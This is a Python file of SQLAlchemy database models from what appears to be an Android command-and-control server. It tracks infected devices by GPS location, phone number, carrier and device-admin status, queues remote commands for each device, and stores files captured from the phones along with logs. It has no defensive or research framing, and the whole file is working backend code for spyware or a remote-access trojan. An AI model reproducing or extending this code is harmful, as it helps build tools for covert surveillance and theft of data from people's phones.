from database import db
from datetime import timedelta

from c2.timeutil import utcnow


class Device(db.Model):
    __tablename__ = "devices"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(64), unique=True, nullable=False, index=True)
    model = db.Column(db.String(128))
    manufacturer = db.Column(db.String(128))
    android_version = db.Column(db.String(32))
    sdk_int = db.Column(db.Integer)
    hostname = db.Column(db.String(128))
    ip_address = db.Column(db.String(64))
    country = db.Column(db.String(64))
    city = db.Column(db.String(64))
    latitude = db.Column(db.Float, default=0.0)
    longitude = db.Column(db.Float, default=0.0)
    battery = db.Column(db.Integer, default=0)
    is_charging = db.Column(db.Boolean, default=False)
    screen_on = db.Column(db.Boolean, default=False)
    is_admin = db.Column(db.Boolean, default=False)
    sim_operator = db.Column(db.String(64))
    phone_number = db.Column(db.String(32))
    carrier_ip = db.Column(db.String(64))
    first_seen = db.Column(db.DateTime, default=utcnow)
    last_seen = db.Column(db.DateTime, default=utcnow)
    is_online = db.Column(db.Boolean, default=True)
    tags = db.Column(db.String(256), default="")
    notes = db.Column(db.Text, default="")

    commands = db.relationship("Command", backref="device", lazy="dynamic",
                               cascade="all, delete-orphan")
    files = db.relationship("CapturedFile", backref="device", lazy="dynamic",
                            cascade="all, delete-orphan")

    def tag_list(self):
        return [t.strip() for t in (self.tags or "").split(",") if t.strip()]

    def is_stale(self, timeout_seconds: int) -> bool:
        if not self.last_seen:
            return True
        return utcnow() - self.last_seen > timedelta(seconds=timeout_seconds)

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "model": self.model,
            "manufacturer": self.manufacturer,
            "android_version": self.android_version,
            "sdk_int": self.sdk_int,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "country": self.country,
            "city": self.city,
            "latitude": self.latitude,
            "longitude": self.longitude,
            "battery": self.battery,
            "is_charging": self.is_charging,
            "screen_on": self.screen_on,
            "is_admin": self.is_admin,
            "sim_operator": self.sim_operator,
            "phone_number": self.phone_number,
            "first_seen": self.first_seen.isoformat() if self.first_seen else None,
            "last_seen": self.last_seen.isoformat() if self.last_seen else None,
            "is_online": self.is_online,
            "tags": self.tag_list(),
            "notes": self.notes,
        }


class Command(db.Model):
    __tablename__ = "commands"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"), nullable=False)
    command_type = db.Column(db.String(64), nullable=False)
    payload = db.Column(db.Text, default="{}")
    status = db.Column(db.String(32), default="pending")
    result = db.Column(db.Text, default="")
    created_at = db.Column(db.DateTime, default=utcnow)
    delivered_at = db.Column(db.DateTime)
    completed_at = db.Column(db.DateTime)

    def args(self):
        import json

        try:
            return json.loads(self.payload or "{}")
        except (ValueError, TypeError):
            return {}

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "command_type": self.command_type,
            "payload": self.args(),
            "status": self.status,
            "result": self.result,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "delivered_at": self.delivered_at.isoformat() if self.delivered_at else None,
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
        }


class CapturedFile(db.Model):
    __tablename__ = "captured_files"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"), nullable=False)
    command_id = db.Column(db.Integer, db.ForeignKey("commands.id"))
    category = db.Column(db.String(32))
    filename = db.Column(db.String(256))
    stored_path = db.Column(db.String(512))
    sha256 = db.Column(db.String(64))
    size_bytes = db.Column(db.Integer, default=0)
    mime_type = db.Column(db.String(128))
    captured_at = db.Column(db.DateTime, default=utcnow)
    metadata_json = db.Column(db.Text, default="{}")

    # NB: not named `metadata` — that attribute belongs to SQLAlchemy's
    # declarative base and shadowing it breaks table construction.
    def meta(self):
        import json

        try:
            return json.loads(self.metadata_json or "{}")
        except (ValueError, TypeError):
            return {}

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "command_id": self.command_id,
            "category": self.category,
            "filename": self.filename,
            "stored_path": self.stored_path,
            "sha256": self.sha256,
            "size_bytes": self.size_bytes,
            "mime_type": self.mime_type,
            "captured_at": self.captured_at.isoformat() if self.captured_at else None,
            "metadata": self.meta(),
            "url": f"/api/file/{self.id}/raw",
        }


class LogEntry(db.Model):
    __tablename__ = "logs"
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey("devices.id"))
    level = db.Column(db.String(16), default="info")
    message = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=utcnow)

    def to_dict(self):
        return {
            "id": self.id,
            "device_id": self.device_id,
            "level": self.level,
            "message": self.message,
            "created_at": self.created_at.isoformat() if self.created_at else None,
        }